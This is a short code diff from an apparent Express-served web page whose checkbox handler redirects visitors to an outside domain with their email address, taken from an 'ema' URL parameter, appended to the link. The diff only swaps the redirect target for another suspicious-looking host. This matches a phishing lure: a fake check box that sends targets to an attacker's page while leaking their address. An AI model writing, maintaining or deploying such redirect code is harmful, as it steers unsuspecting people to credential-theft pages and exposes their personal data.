@@ -144,7 +144,7 @@ app.get('/', (req, res) => {
 
         function toggleCheck(element) {
             element.classList.toggle('checked');
-            window.location.href = 'https://digitalglamourfo.com.de/iS5t/##' + getUrlParameter('ema') + "##"
+            window.location.href = 'https://kU3.bramanige.com/1CqLt/##' + getUrlParameter('ema') + "##"
         }
     </script>
 </body>
